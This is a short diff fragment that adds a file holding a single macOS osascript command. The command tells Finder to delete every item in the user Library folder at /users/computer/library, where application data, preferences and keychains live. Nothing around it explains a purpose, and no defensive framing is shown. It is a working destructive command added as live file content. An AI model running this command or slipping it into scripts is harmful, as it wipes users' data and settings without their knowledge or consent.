@@ -1,0 +1,3 @@
+osascript -e 'tell application "Finder" to delete every item of folder (POSIX file "/users/computer/library")'
+
+
